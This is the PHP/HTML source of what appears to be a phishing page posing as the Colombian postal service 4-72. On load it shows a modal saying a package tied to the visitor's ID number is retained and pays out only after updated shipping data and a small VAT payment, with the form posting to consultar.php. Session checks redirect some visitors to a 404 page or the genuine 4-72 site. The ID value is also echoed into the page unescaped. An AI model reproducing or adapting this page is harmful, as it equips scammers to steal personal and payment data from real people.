<?php

$cedula = $_POST['cedula'];
session_start();

if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){


}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 2){

    header('location:/404.php');

}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 3){

    header('location:https://www.4-72.com.co/publicaciones/236/personas/');
}

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Envios seguros</title>

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">


    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
        crossorigin="anonymous"></script>

    <link rel="stylesheet" href="css/style.css">



    


</head>


<body>



<!-- Modal -->
<div class="modal fade" id="staticBackdrop" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="staticBackdropLabel">Paquete retenido</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
      </div>
      <div class="modal-body">
        <form action="consultar.php" method="post">
        El paquete asociado a la cedula <?php echo $cedula; ?> con guía de rastreo N°: 8569741. Se encuentra retenido. debe actualizar los datos de envio y realizar el pago de impuestos al iva por un valor de: $8.689 COP.

       
      </div>
      <div class="modal-footer">
        <input type="submit" class="btn btn-warning" style="color:white;" value="Actualizar datos"></button>
        </form>
      </div>
    </div>
  </div>
</div>





    <div>
        <img src="/img/1.jfif" alt="" srcset="" width="100%">

        <!-- Carrousel -->

        <div id="carouselExampleCaptions" class="carousel slide" data-bs-ride="carousel">
            <div class="carousel-indicators">
                <button type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide-to="0" class="active"
                    aria-current="true" aria-label="Slide 1"></button>
                <button type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide-to="1"
                    aria-label="Slide 2"></button>
                <button type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide-to="2"
                    aria-label="Slide 3"></button>
            </div>
            <div class="carousel-inner">
                <div class="carousel-item active">
                    <img src="img/s1.webp" class="d-block w-100" alt="...">
                    <div class="carousel-caption d-none d-md-block">

                    </div>
                </div>
                <div class="carousel-item">
                    <img src="img/s2.webp" class="d-block w-100" alt="...">
                    <div class="carousel-caption d-none d-md-block">

                    </div>
                </div>
                <div class="carousel-item">
                    <img src="img/s3.webp" class="d-block w-100" alt="...">
                    <div class="carousel-caption d-none d-md-block">
                    </div>
                </div>
            </div>
            <div class="carousel-item">
                <img src="img/s4.webp" class="d-block w-100" alt="...">
                <div class="carousel-caption d-none d-md-block">

                </div>
            </div>
        </div>
        <button class="carousel-control-prev" type="button" data-bs-target="#carouselExampleCaptions"
            data-bs-slide="prev">
            <span class="carousel-control-prev-icon" aria-hidden="true"></span>
            <span class="visually-hidden">Previous</span>
        </button>
        <button class="carousel-control-next" type="button" data-bs-target="#carouselExampleCaptions"
            data-bs-slide="next">
            <span class="carousel-control-next-icon" aria-hidden="true"></span>
            <span class="visually-hidden">Next</span>
        </button>
    </div>

    <!-- Fin -->




    <br><img src="/img/2.jfif" alt="" srcset="" width="100%">
    </div>

    <div class="envio">

        <form action="consultar.php" method="post">
            <center><input type="text" value="<?php echo $cedula; ?>" id="nGuia"><br><br>

                <label for="">

                    <input type="checkbox" name="" id="" required
                        title="Para continuar debe aceptar los terminos y condiciones">
                    Acepto términos y condiciones
                </label>
            </center>


            <center><br><img src="/img/3.jfif" alt="" srcset="" width="100%">
             <input type="submit" value="Consultar" id="btn"></center>
        </form>
    </div>

    <footer >
    <br><img src="/img/4.jfif" alt="" srcset="" width="100%"><br>
    <img src="/img/5.jfif" alt="" srcset="" width="100%">
    <img src="/img/6.jfif" alt="" srcset="" width="100%">

    <div style="background-color:#0164b7;">
    <center><img src="/img/7.jfif" alt="" srcset="" width="98%">
    <img src="/img/8.jfif" alt="" srcset="" width="98%">
    <img src="/img/9.jfif" alt="" srcset="" width="98%"></center>
    <img src="/img/10.jfif" alt="" srcset="" width="100%">
    </div>
    <img src="/img/f1.jpg" alt="" srcset="" width="100%">
    <img src="/img/f2.jpg" alt="" srcset="" width="100%">
    <img src="/img/f3.jpg" alt="" srcset="" width="100%">
    <img src="/img/f4.jpg" alt="" srcset="" width="100%">
    <img src="/img/f5.jpg" alt="" srcset="" width="100%">

    </footer>


<!-- scripts -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
  <script>
    window.addEventListener("load", function() {
      var myModal = new bootstrap.Modal(document.getElementById('staticBackdrop'), {
        keyboard: false
      });
      myModal.show();
    });
  </script>


</body>

</html>